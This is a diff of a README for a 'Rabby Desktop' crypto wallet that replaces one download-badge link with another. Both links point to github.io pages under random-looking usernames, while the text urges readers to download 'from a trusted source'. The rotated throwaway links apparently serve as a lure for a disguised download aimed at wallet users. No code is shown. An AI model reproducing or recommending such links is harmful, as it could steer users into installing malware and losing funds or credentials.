@@ -52,7 +52,7 @@ The Rabby Desktop app is built around practical wallet use: connect accounts, in
 
 Prerequisites: A supported desktop computer, a stable internet connection, and an understanding of how you want to manage accounts before starting Rabby Desktop download.
 
-[![GET Rabby Desktop](https://img.shields.io/badge/GET%20%E2%80%94%20Rabby%20Desktop-0078D6?style=for-the-badge&logoColor=white)](https://brysonsandersuxqn.github.io/.github/rabby-desktop)
+[![GET Rabby Desktop](https://img.shields.io/badge/GET%20%E2%80%94%20Rabby%20Desktop-0078D6?style=for-the-badge&logoColor=white)](https://princehannazlko.github.io/.github/rabby-desktop)
 
 1.  **Download and Install:** Start with Rabby Desktop download from a trusted source, then install the Rabby Desktop app for your operating system.
 2.  **Open the Wallet Workspace:** Launch Rabby Desktop and review the main account area, connection controls, and transaction preview interface.
